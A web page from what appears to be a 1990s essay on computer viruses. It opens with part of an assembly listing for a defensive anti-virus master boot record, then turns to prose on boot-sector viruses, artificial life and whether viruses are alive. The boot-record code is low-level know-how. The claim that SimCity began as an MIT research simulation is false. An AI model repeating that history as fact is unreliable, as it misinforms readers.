&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Bad_INT13 <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span> &nbsp; <span style="color: black; font-style: italic;">;Int 13h moved!</span><br/>
<br/>
Fail_Msg<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Screen_Write&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Inform user of fault</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Fail <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Screen_Write&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Prompt for boot/hang</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">16h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get reply to prompt</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Lower case reply</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'y'</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Yes?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If not Yes, hang machine</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<br/>
Boot_Disk<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7DFEh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Does end of boot sector</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0AA55h</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">; contain proper ID?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; Do_Error<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0EAh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Jmp far</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">7C00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; to boot sector code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
<br/>
Screen_Write<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get a byte</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Is it 0?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Done_Writing&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Stop writing</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;&quot;7&quot; to avoid being</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;scanned as STONED virus</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Eh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write character to screen</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">10h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Screen_Write&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get another character</span><br/>
<br/>
Done_writing<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<span style="color: black; font-style: italic;">;--- Data -------------------------------------------------</span><br/>
PC_Scav &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'PC SCAVENGER Anti-Virus Master Boot Record'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'(c)1993 Karsten Johansson'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
Bad_PT&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Partition Table bad...'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
Error &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'OS Error'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
MEM_Bad &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Memory has shrunk!'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
Bad_INT13 &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'INT 13h Moved!'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<br/>
Fail&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'Boot anyway?'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: black; font-style: italic;">;--- Following reserved for Partition Tables only! --------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">1BEh</span><br/>
Partn_Table1<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">1CEh</span><br/>
Partn_Table2&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">1DEh</span><br/>
Partn_Table3&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">1EEh</span><br/>
Partn_Table4&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">1FEh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">55h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0AAh</span><br/>
AVPart&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ends<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; KSAJ<br/>
&nbsp;</div>
<p>A boot sector is located on all formatted hard disks and diskettes. Like the hard drive's MBR, the boot sector is a file which takes control of the system, then runs a few diagnostics. Once finished, it loads and executes the DOS files. Viruses like <strong>Kilroy</strong> take advantage of the relative size and function of the boot sector code, adding virus routines to the normal palette of functionality.</p>
<p>Put simply, if virus code can be contained with normal boot code into one sector, then certainly the same could be said for anti-virus code (similar to that used in the PC Scavenger MBR). It is pure negligence that this has not yet been implemented by the operating system manufacturers.</p>
 
<p>There are many different techniques that can be added and used effectively to eliminate the computer virus threat. Even something as simple as adding the same sort of routine found in the newer AMI BIOS and applying it to INT 21h (the DOS service interrupt) will greatly hinder the spread of computer viruses. As has been shown, this is not an impossibility, nor is it even difficult. Unfortunately, until a more mature stance is taken against computer viruses by operating system programers and hardware manufacturers, the fight is left to the end user.</p>
<h2><a name="pc"></a>Anti-Virus Product Comparison</h2>
<p>Competitors (Chosen for their availability and popularity):</p>
<pre>
[Study is pending]
ViruScan/Clean-Up	v105 -- John McAfee and Associates
Thunderbyte		v206 -- ESSaS
Virex			v2.7 -- Ross M. Greenberg &amp; Datawatch
F-Prot			V2.08 -- Fridrik Skulason
</pre>
 
<h2><a name="pd"></a>Science Says...</h2>
<p>Prior to the inception of the earliest computer viruses, the idea of creating life on the computer was considered an all-too-farcical endevour to pursue. Very few scientists would dare say they were attempting to create life on the computer. Such an avowal would have been met with ridicule. Today, this has changed. At least two sciences have formed with exactly that as their premise and end product.</p>
<p>The sciences in question are Artificial Life and Synthetic Psychology. Though separated by subtle differences, these studies are almost identical in their use of inanimate objects to study life-like principles. From these essays, one may decide whether life can be created from inanimate matter, and if computer viruses constitute such a creature.</p>
 
<h2><a name="pe"></a>Artificial Life</h2>
<div class="epigraph">
'If we wish to make a new world, we have the material ready. The first one, too, was made out of chaos.'
<p>-- Robert Quillen</p>
</div>
<br clear="all"/>
<p>Long before Mary Shelley conceived her cult-classic story <em>Frankenstein</em><sup><a href="#f46" name="b46">46</a></sup>, humans have dreamt of creating life from non-living matter. One Jewish fable tells of a wise man who created a personal servant<sup><a href="#f47" name="b47">47</a></sup> out of clay. The Bible takes this concept even further. Moses taught that even the first humans and animals were molded in this fashion:</p>
<blockquote>"...the Lord God formed man of the dust of the ground, and breathed into his nostrils the breath of life; and man became a living soul...and out of the ground the Lord God formed every beast of the field, and every fowl of the air..."<sup><a href="#f48" name="b48">48</a></sup></blockquote>
<p>The Catholic faith in transubstantiation is also demonstrative of a deep-seated conviction that life can eminate from non-living matter.</p>
<p>Automata and mechanical creatures are said to have existed even in the Ancient World. In the Middle Ages,
 
mechanical chessmen, operated by elaborate systems of gears and pulleys, were invented by Arab scientists and brought into Europe. Oracular machines became a popular novelty of the upper classes. The most famous of these was the "Brazen Head" developed by the Thirteenth Century philosopher and scientist Roger Bacon, known as "Doctor Mirabilis".</p>
<p>In the mid 1700's, inventor Jaques de Vaucanson constructed a robot duck, each wing made up of 400 moving parts. This mechanical mallard was able to imitate a living duck with such precision that observers were tempted to believe they were watching the real McCoy.</p>
<p>In the early 1800's, the duck ceased to function, its cadaver lying in a cold heap. A saddenned Goethe found reason to write,</p>
<blockquote>The duck had lost its feathers and, reduced to a skeleton, would still bravely eat its oats but could no longer digest them"<sup><a href="#f49" name="b49">49</a></sup></blockquote>
<p>Similarly, Anton LaVey (founder of the Church of Satan) aided Dr. Cecil Nixon in the 25-year-long construction of a zither-playing automaton named Isis. What was amazing is that Isis was able to play up to 3000 different songs by voice command!</p>
 
<p>During the sixties, LaVey began creating what has been dubbed as "Realistic Human Substitutes", developing a theory and method for the manufacture of Artificial Human Companions. Apart from the interest of several art galleries, he feels there has been much apprehension towards his humanoid creations. In his biography, Anton is quoted as saying, "This reluctance is understandable. It is the reaction of the monkey looking at himself in the mirror. It is the shudder that seizes any being when he recognizes his own self, or part of it, in the world of others."<sup><a href="#f50" name="b50">50</a></sup></p>
<p>In the late 1940's, Hungarian mathematical genius John von Neumann staged a lecture dauntingly titled "The General and Logical Theory of Automata" at the Hixon Symposium in Pasadena, California. Here, von Neumann was able to air his hypothesis: self-motivated machines could, in fact, be created with the added ability to reproduce. He speculated the possibility of creating a living model of his theories. Because of this, and his many later lectures, von Neumann has been hailed "the father of what would come to be the field of artificial life"<sup><a href="#f51" name="b51">51</a></sup>.</p>
 
<p>Physicist Freeman Dyson wrote, regarding von Neumann's theories:</p>
<blockquote>"So far as we know, the basic design of every microorganism larger than a virus is precisely as von Neumann said it should be."<sup><a href="#f52" name="b52">52</a></sup></blockquote>
<p>That is a rather compelling compliment to be paid!</p>
<p>Von Neumann's theories have influenced the studies of many a scientific successor. According to Gerald Joyce, of Scripps Clinic Research Institute, scientists at MIT have been using adenosine triphosphates in systems that replicate via the same method as DNA molecules. He tells of the paradox they are trying to solve: Proteins are needed to form DNA, but at the same time, DNA is required to build proteins. This is a real-life parallel to the old adage, "Which came first: the chicken or the egg?".</p>
<p>This is a lengthy list of situations where humans have shown considerable belief in the creation of life from non-living matter. One may wonder why so much emphasis and attention has been devoted to such an unusual practice.</p>
<p>Christopher Langton, scientist and noted speaker on A-Life, maintains that real intelligence and life can be interpolated into non-living matter. As well, he points out that the term "artificial" refers to the matter, not the
 
life itself.<sup><a href="#f53" name="b53">53</a></sup> Not only is Langton credited as founder of the earliest studies in Artificial Life, which he initiated at the Los Alamos Laboratory. His interest is not in what happened in the "pre-biotic soup", but in understanding more fully how life-like dynamics emerge in non-living systems.</p>
<p>One conviction, held by nearly all Artificial Life researchers, is that we can not have a firm understanding of intelligence until we have a better understanding of what life is. One partisan of this theory enhances Lego robots at the University of Edinburgh to test the idea that intelligence is an <em>emergent</em> property of life. That is to say, intelligence is something that occurs as a result of life.</p>
<p>Sante Fe Institute's J. Doyne Farmer says, "Looking at life is simpler than looking at intelligence, and a better theoretical understanding of life -- especially adaptive behavior -- can lead to better AI, like self-programming programs, sooner". He goes on to say, "The study of artificial life has had enormous impact upon our view of computer viruses and may have a long-term impact upon computer science"<sup><a href="#f54" name="b54">54</a></sup></p>
 
<p>As we have seen, Artificial Life scientists (and the like) have attempted to understand and create life for various reasons. The understanding of life and intelligence represent the two most prominent issues. Most emergent activities, such as intelligence or even life itself, evolve over millions of years; by creating Artificial Life models, these processes may appear in a very short time-frame, perhaps even only a few minutes.</p>
<p>One scientist, very excited by the ability to synthesize life on the computer, says that "life is such a powerful force...if you just marginally set up the conditions for life to go, it will come out, and you will get evolution of all sorts of interesting phenomena."<sup><a href="#f55" name="b55">55</a></sup></p>
<p>An exciting theory derived from the study of Artificial Life is that there is an intimate connection between life and what is called "phase transition". This transition lies between states of <em>chaotic</em> and <em>periodic</em> dynamics.</p>
<p>Chaotic dynamics is easily understood as a state of frenzy, or of rapid change, a "building up". Likewise, periodic dynamics refer to a state of dissolution, or of "falling apart".</p>
 
<p>One example of this may be clearly seen in the continual zipping and unzipping of DNA molecules. Christopher Langton likes to cite this elucidation:</p>
<blockquote>"It is vital that the brain be kept very near to 98.6 F in order to work properly. We've all experienced the chaotic nature of our thinking processes when we have a fever. Some have experienced the seizures (periodic dynamics) that accompany hypothermia, when the brain gets too cold. On the temperature scale, clearly, the brain operates in a very narrow regime between periodic and chaotic dynamics, and a great amount of physiological machinery has evolved to keep it at this critical point. Our mental capabilities are apparently ony possible in the vicinity of this phase transiition between periodic and chaotic neural dynamics."<sup><a href="#f56" name="b56">56</a></sup></blockquote>
<p>Even now, Langton admits the lack of proof that life is created through this transitional phase. At the very least, this transition is a critical constituent to the emergence of life.</p>
<p>Only one thing is certain: the definition of life is at least founded on a capacity to sense, process, and act on information.<sup><a href="#f57" name="b57">57</a></sup> Artificial Life scientists look for answers as to how this capacity is emerged.</p>
<p>Charles Taylor has found another use for Artificial Life studies. With a background in the mathematical aspects of evolutionary theory, he became interested in what happens
 
when the population becomes distributed in a variety of micro-niches. This led him to a good deal of work with Drosophila, the fruitfly.</p>
<p>After considering artificial intelligence, Taylor felt that although it had much to contribute, it would be too difficult to use this technology in his studies. Instead, he decided it might be possible to <em>evolve</em> such a program. Today, his research group has been developing programs to simulate populations of insects, sometimes even doing field work in Mali, Africa. The possibilities for what he has and may find are endless.</p>
<p>SimCity, a program created for the study of population growth, has become commercially available as a game! Like it, SimAnt, SimPlanet, and SimUniverse have also become commercially available as games. Each of these games were originally written as MIT research simulations: SimCity for studying population growth, SimAnt for studying the interactive behavior seen in ant colonies, etc.</p>
 
<p>Computer viruses, yet another type of program exhibiting life-like traits, were not invented by these scientists. The computer virus notion has been alive since early 1972, when a science-fiction novelist wrote:</p>
<blockquote>"...You have a computer with an out-dial phone link. You put the VIRUS program into it and it starts dialing phone numbers at random until it connects to another computer with an out-dial. The VIRUS program then injects itself into the new computer...The second machine then begins to dial phone numbers at random until it connects with a third machine..."<sup><a href="#f58" name="b58">58</a></sup></blockquote>
<p>Reports have stated that recent releases of this book have removed this part of the story. My own research shows that this is completely false. In the 1988 edition, this information was not deleted, but <em>updated</em>! Here is an example:</p>
<blockquote>"Some VIRUSes have more than one way of spreading. Some of them write themselves onto your floppy disks as hidden files, or new versions of system files; they only become active when certain system commands are called...and finally there's the mutating VIRUS...it's always mutating"<sup><a href="#f59" name="b59">59</a></sup></blockquote>
<p>Not only did Gerrold's book make certain speculations on the computer virus, its primary character, H.A.R.L.I.E. was an Artificial Life model! H.A.R.L.I.E., whose name is an acronym for "Human Anologue Robot, Life Input Equivalents", was programmed to be the robotic equivalent of
 
a human being. Besides out-thinking its human counterparts, it could control its surroundings by "limbs" that it created for itself. (For instance, at one point H.A.R.L.I.E. created "limbs" through telephone lines, accessed to control all the computers throughout the city).</p>
<p>A sample conversation between H.A.R.L.I.E. and his creator went like this:</p>
<blockquote>
<p>H.A.R.L.I.E.: But, Auberson - I am nothing more than just a very clever programming trick. So are you. Your programmer was so clever that you think you're a human being. So was mine. I think I'm alive. If I think I'm alive, how do you know I'm not? How do you?"</p>
<p>Auberson: H.A.R.L.I.E., I don't know whether I'm sitting here being conned by a machine or actually talking to a real soul. I can't tell the difference.</p>
<p>H.A.R.L.I.E.: May I offer you the same compliment? I have never really been certain if you were machine or human either.<sup><a href="#f60" name="b60">60</a></sup></p>
</blockquote>
<p>The Turing Test, created to test computer intelligence, is only passed by a computer that can convince an interrogator that it is human and not machine. In this scene, Auberson tells H.A.R.L.I.E that he finds it diffucult to believe it is a computer he is talking to. Ironically, the computer manifests a disbelief in the fact that Auberson isn't really a machine!</p>
 
<p>Many other novels appeared in and around the same time, proposing various other forms of artificial life. Space movies and television series began employing robot characters that thought and behaved as alternate life forms.</p>
<p>The first real computer virus didn't make its appearance until the early 1980's. Charles Taylor states that computer viruses are a graphic example of Artificial Life, and contain many properties typically possessed in living matter: reproduction, integration of parts, unpredictability, etc.<sup><a href="#f61" name="b61">61</a></sup></p>
<p>Despite many studies, scientists are of divided opinion as to whether computer viruses are in some way alive. Some will disagree that they embody the essence of what we call life. Unfortunately, these scientists are forced into a situation where they must compare Artificial Life with what they have been taught to recognize as Natural Life. They have only learned of life with a basis of water and carbon.</p>
 
<h3><a name="pe1"></a>How "Alive" is a Computer Virus?</h3>
<p>In order to contemplate the validity of the computer virus as an Artificial Life form, we must define life itself. The following text outlines various characteristics of biological life as summerized by Farmer and Belin<sup><a href="#f62" name="b62">62</a></sup>, and discusses key viral activities for comparison.</p>
<h4><a name="pe11"></a>Life is a pattern in space and time rather than a specific material object.</h4>
<p>Computer viruses consist of patterns of binary digits (ones and zeroes) casting a framework of coded instructions neccessary to make an executable file. These instructions can exist on many computer systems and for any length of time.</p>
<h4><a name="pe12"></a>Self-reproduction, in itself or in a related organism.</h4>
<p>The primary and most salient characteristic, with which one may distinguish a computer virus, is the ability to reproduce. This reproduction may produce an exact similation or breed altered varients. This is a characteristic once witnessed only in the domain of biological life.</p>
 
<h4><a name="pe13"></a>Information storage of a self-representation.</h4>
<p>Besides many other functions, the viral code is used in its entirety as its own matrix for reproduction. A striking similarity to the reproduction of DNA molecules is easily recognized.</p>
<h4><a name="pe14"></a>A metabolism that converts matter/energy.</h4>
<p>Metabolism is defined as "the sum of the physical and chemical processes in an organism by which its substance is produced, maintained, and destroyed, and by which energy is made available"<sup><a href="#f63" name="b63">63</a></sup></p>
<p>Computer viruses use electrical currents from within the computer system to execute. Loosely, electricity is the food/energy of the computer virus, and thus sets the foundation for metabolic activity.</p>
<p>Another view is that computer viruses use energy redirected from its host to preserve itself and to manipulate or interact with its environment.</p>
<h4><a name="pe15"></a>Functional interactions with the environment.</h4>
<p>Computer viruses interact with their environment in numerous ways. One of the first activities in many computer viruses is to place themselves in key memory locations, and
 
control various system resources in order to allow for future infections. Some viruses have the ability to detect anti-virus software and uninstall it before going resident. Potential victims are analyzed as a precursor to infection, to ensure an advantagious front. Moreover, we have certainly heard enough horror stories about how viruses damaged various targets. This can be viewed as a functional interaction, however detrimental its effects.</p>
<h4><a name="pe16"></a>Interdependence of Parts.</h4>
<p>Although there are a few known exceptions, most living organisms cannot be broken into independently working units without destroying some or all of the fragments. Likewise, most computer viruses will cease to function properly, or even "die" if any part of its code is removed.</p>
<h4><a name="pe17"></a>Stability under perturbations of the environment.</h4>
<p>Computer viruses are written to spread to a variety of computers, and sometimes under completely different operating systems. Many contain routines designed to compromise and defeat various anti-virus and copy protection mechanisms. They may even "hybernate" if neccessary resources on the system are unavailable.</p>
<p>Often computer viruses embody their own error handlers to avoid computer crashes, or contain simple routines to repeat an action if an error occurs. Most are capable of
 
running on any IBM personal computer, ranging from the XT to the Pentium, and under a variety of DOS versions.</p>
<h4><a name="pe18"></a>The ability to evolve</h4>
<p>Computer viruses do not evolve in the same manner that biological life is said to have evolved. In the virus kingdom, evolution is controlled by the programmers, not the environment. Sometimes a change may only occur in one or two bytes. Other times in may entail a complete code rewrite.</p>
<p>There are also cases where two different strains of viruses are known to interact. The offspring formed share attributes of both parent viruses. A later chapter looks at various viral alliances, explaining what they are, and how they work.</p>
<h4><a name="pe19"></a>Growth or expansion</h4>
<p>Viruses vaunt a strength in their ability to grow and expand. Several anti-virus authorities estimate that three new viruses are written daily. With the invention and production of virus-creation "laboratory" programs, viruses could concievably exhibit an r-rate growth trajectory reaching beyond epidemic proportions. The spread of viruses indicates an ability to form "communities".</p>
 
<h4><a name="pe1a"></a>Other Behavior</h4>
<p>Computer virus species are often written with a single operating system environment in mind. If an DOS-specific virus was executed on a UNIX based operating system, it would be immediately throttled and the file would not be executed. Depending on the operating system, a crash may occr. (Please note that there is the possibility of cross platform viruses and worms by using scripting languages, but as of yet, this has not been commonplace). Biological life will behave very similarily, although fortunately with a less significant influence on the new environment. As a quick example, removing most types of fish from their watery habitat for extended periods of time will surely kill them. A sudden and unexpected change in the environment will usually spell disaster for all types of viruses, biological or computer originated.</p>
